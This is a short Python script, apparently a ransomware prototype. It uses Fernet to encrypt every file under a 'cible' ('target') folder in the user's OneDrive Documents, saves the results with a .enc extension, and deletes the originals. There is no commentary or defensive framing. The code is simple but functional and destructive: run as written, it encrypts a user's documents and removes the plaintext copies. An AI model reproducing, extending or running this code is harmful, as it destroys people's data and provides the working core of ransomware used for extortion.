import os
from cryptography.fernet import Fernet

KEY_FILE = "encrypte.key"

def generate_key():
    if not os.path.exists(KEY_FILE):
        key = Fernet.generate_key()
        with open(KEY_FILE, "wb") as key_file:
            key_file.write(key)
    else:
        return

def load_key():
    return open(KEY_FILE, "rb").read()

def encrypt_file(file, key):
    with open(file, "rb") as f:
        data = f.read()
    
    fernet = Fernet(key)
    encrypt_data = fernet.encrypt(data)
    
    with open(file + ".enc", "wb") as f:
        f.write(encrypt_data)
    os.remove(file)
    
    print(f"File encrypted: {file}")
    
def encrypt_all_files(directory, key):
    for root, dirs, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            if not file.endswith(".enc") and file != KEY_FILE:
                encrypt_file(file_path, key)

if __name__ == "__main__":
    generate_key()
    key = load_key()
    folder = os.path.join(os.environ["USERPROFILE"], "OneDrive", "Documents", "cible")
    encrypt_all_files(folder, key)